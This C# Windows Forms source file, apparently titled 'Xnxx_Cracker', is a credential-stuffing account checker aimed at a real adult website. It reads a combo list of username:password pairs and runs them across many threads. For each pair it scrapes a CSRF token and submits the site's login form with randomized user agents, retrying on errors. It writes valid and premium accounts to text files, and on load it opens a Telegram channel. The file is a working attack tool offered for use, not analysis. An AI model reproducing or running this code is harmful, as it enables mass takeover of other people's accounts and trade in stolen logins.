using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Windows.Forms;
using ThreadGun;

namespace Xnxx_Cracker
{
    public partial class Form1 : Form
    {

        List<string> Combo = new List<string>();
        int Bad;
        int Good;
        int Remaining;
        int Checked;
        int Premium;
        string ResultTime;

        public Form1()
        {
            InitializeComponent();
            this.FormClosing += Form1_FormClosing;
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            Process.GetCurrentProcess().Kill();
        }

        private void btnStart_Click(object sender, EventArgs e)
        {
            try
            {
                if (Combo.Count == 0)
                {
                    MessageBox.Show("Please Load Combo.", "Start");
                }
                else
                {
                    if (numericUpDown1.Value > Combo.Count)
                    {
                        numericUpDown1.Value = Combo.Count;
                    }
                    if (Checked == 0)
                    {
                        ResultTime = $"{DateTime.Now.ToString($"{0:yyyy-MM-dd}" + "---" + $"{0:HH-mm-ss}")}";
                        Directory.CreateDirectory("Checked in " + $"{ResultTime}");
                        new ThreadGun<string>(Config, Combo, (int)numericUpDown1.Value, Thr_Completed, null).FillingMagazine().Start();
                    }
                }
            }
            catch
            {
                Directory.Delete("Checked in " + $"{ResultTime}");
                MessageBox.Show("Error To Start Checking.", "Start");
            }
        }

        private void Config(string line)
        {
            string User = line.Split(':')[0];
            string Pass = line.Split(':')[1];
            for (int i = 2; i < line.Split(':').Length; i++)
            {
                Pass += ":" + line.Split(':')[i];
            }
            First:
            try
            {
                CookieStorage cook = new CookieStorage();
                using(HttpRequest Web = new HttpRequest())
                {
                    Web.AddHeader(HttpHeader.Accept, "application/json, text/javascript, */*; q=0.01");
                    Web.AddHeader(HttpHeader.AcceptLanguage, "en-US,en;q=0.9");
                    Web.AddHeader(HttpHeader.Origin, "https://www.xnxx.gold");
                    Web.AddHeader("sec-ch-ua", "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"90\", \"Google Chrome\";v=\"90\"");
                    Web.AddHeader("sec-ch-ua-mobile", "?0");
                    Web.AddHeader("Sec-Fetch-Dest", "empty");
                    Web.AddHeader("Sec-Fetch-Mode", "cors");
                    Web.AddHeader("Sec-Fetch-Site", "same-origin");
                    Web.AddHeader("X-Requested-With", "XMLHttpRequest");
                    Web.Referer = "https://www.xnxx.gold/account/email";
                    Web.UserAgentRandomize();
                    Web.UseCookies = true;
                    Web.Cookies = cook;
                    Web.KeepAlive = true;
                    Web.IgnoreProtocolErrors = true;
                    Web.AllowAutoRedirect = true;
                    string Response3 = Web.Post("https://www.xnxx.gold/account/signinform", " ", "application/json").ToString();
                    string C = Regex.Match(Response3, "{\"form_valid\"(.*?)group form-field-signin-form_password").Groups[1].Value.ToString();
                    string CS = Regex.Match(C, "\\\"signin-form_post_referer(.*?)id=\\\\\"signin-form_csrf_token").Groups[1].Value.ToString();
                    string CSRF = Regex.Match(CS, "value=\\\\\"(.*?)\\\\\"").Groups[1].Value.ToString();
                    string PM = Regex.Match(C, "id=\\\\\"signin-form_csrf_token(.*?)id=\\\\\"signin-form_pms").Groups[1].Value.ToString();
                    string PMS = Regex.Match(PM, "value=\\\\\"(.*?)\\\\\"").Groups[1].Value.ToString();
                    //========================//
                    Web.AddHeader(HttpHeader.Accept, "application/json, text/javascript, */*; q=0.01");
                    Web.AddHeader(HttpHeader.AcceptLanguage, "en-US,en;q=0.9");
                    Web.AddHeader(HttpHeader.Origin, "https://www.xnxx.gold");
                    Web.AddHeader("sec-ch-ua", "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"90\", \"Google Chrome\";v=\"90\"");
                    Web.AddHeader("sec-ch-ua-mobile", "?0");
                    Web.AddHeader("Sec-Fetch-Dest", "empty");
                    Web.AddHeader("Sec-Fetch-Mode", "cors");
                    Web.AddHeader("Sec-Fetch-Site", "same-origin");
                    Web.AddHeader("X-Requested-With", "XMLHttpRequest");
                    Web.Referer = "https://www.xnxx.gold/account/email";
                    Web.UserAgentRandomize();
                    Web.UseCookies = true;
                    Web.Cookies = cook;
                    Web.KeepAlive = true;
                    Web.IgnoreProtocolErrors = true;
                    Web.AllowAutoRedirect = true;
                    var Data = Web.Post("https://www.xnxx.gold/account/signinform", Encoding.ASCII.GetBytes($"signin-form%5Bvotes%5D=&signin-form%5Bsubs%5D=&signin-form%5Bpost_referer%5D=https%3A%2F%2Fwww.xnxx.gold%2Faccount%2Femail&signin-form%5Bcsrf_token%5D={CSRF}&signin-form%5Bpms%5D={PMS}&signin-form%5Blogin%5D={User}&signin-form%5Bpassword%5D={Pass}"), "application/x-www-form-urlencoded; charset=UTF-8");
                    if (Data.ToString().Contains("Unable to login. Please check your login / password.") || Data.ToString().Contains("Invalid email address."))
                    {
                        Bad++;
                        Checked++;
                        Remaining = Combo.Count - Checked;
                        lblBad.Invoke(new MethodInvoker(delegate { lblBad.Text = "Bad: " + Bad.ToString(); }));
                        lblCheck.Invoke(new MethodInvoker(delegate { lblCheck.Text = "Check: " + Checked.ToString(); }));
                        lblRemain.Invoke(new MethodInvoker(delegate { lblRemain.Text = "Remain: " + Remaining.ToString(); }));
                        StreamWriter sw = new StreamWriter("Checked in " + $"{ResultTime}\\Bad.txt", true);
                        sw.WriteLine($"{User}:{Pass}");
                        sw.Close();
                    }
                    else if (Data.ToString().Contains("\"is_premium\":false"))
                    {
                        Good++;
                        Checked++;
                        Remaining = Combo.Count - Checked;
                        lblGood.Invoke(new MethodInvoker(delegate { lblGood.Text = "Good: " + Good.ToString(); }));
                        lblCheck.Invoke(new MethodInvoker(delegate { lblCheck.Text = "Check: " + Checked.ToString(); }));
                        lblRemain.Invoke(new MethodInvoker(delegate { lblRemain.Text = "Remain: " + Remaining.ToString(); }));
                        StreamWriter sw = new StreamWriter("Checked in " + $"{ResultTime}\\Good.txt", true);
                        sw.WriteLine($"Username: {User}\nPassword: {Pass}\n{User}:{Pass}\n----------------------------------------\n\n");
                        sw.Close();
                    }
                    else if (Data.ToString().Contains("\"is_premium\":true"))
                    {
                        Good++;
                        Premium++;
                        Checked++;
                        Remaining = Combo.Count - Checked;
                        lblGood.Invoke(new MethodInvoker(delegate { lblGood.Text = "Good: " + Good.ToString(); }));
                        lblPremium.Invoke(new MethodInvoker(delegate { lblPremium.Text = "Premium: " + Premium.ToString(); }));
                        lblCheck.Invoke(new MethodInvoker(delegate { lblCheck.Text = "Check: " + Checked.ToString(); }));
                        lblRemain.Invoke(new MethodInvoker(delegate { lblRemain.Text = "Remain: " + Remaining.ToString(); }));
                        StreamWriter sw = new StreamWriter("Checked in " + $"{ResultTime}\\Premium.txt", true);
                        sw.WriteLine($"-----------------Start-----------------\nUsername: {User}\nPassword: {Pass}\n{User}:{Pass}\n-----------------End-----------------\n\n");
                        sw.Close();
                    }
                    else
                    {
                        goto First;
                    }
                }
            }
            catch
            {
                goto First;
            }
        }

        private void btnCombo_Click(object sender, EventArgs e)
        {
            try
            {
                OpenFileDialog Open = new OpenFileDialog();
                Open.Filter = "Select Combo |*.txt";
                Open.Multiselect = false;
                Open.Title = "Select Combo ";
                if (Open.ShowDialog() == DialogResult == false)
                {
                    Combo.Clear();
                    StreamReader sr = new StreamReader(Open.FileName);
                    while (!sr.EndOfStream)
                    {
                        try
                        {
                            string txt = sr.ReadLine();
                            char[] Spl = { ':' };
                            string[] Comb = txt.Split(Spl);
                            string Com = Comb[1];
                            for (int i = 2; i < Comb.Length; i++)
                            {
                                Com += ":" + Comb[i];
                            }
                            Combo.Add(Comb[0] + ":" + Com);
                        }
                        catch
                        {

                        }
                    }
                    sr.Close();
                    btnCombo.Text = Combo.Count.ToString();
                }
            }
            catch
            {
                MessageBox.Show("Error To Load Combo.", "Combo");
            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            Process.Start("https://t.me/Ariaei_co");
        }

        private void Thr_Completed(IEnumerable<string> inputs)
        {
            MessageBox.Show("Check Was Completed.", "Complet");
        }
    }
}
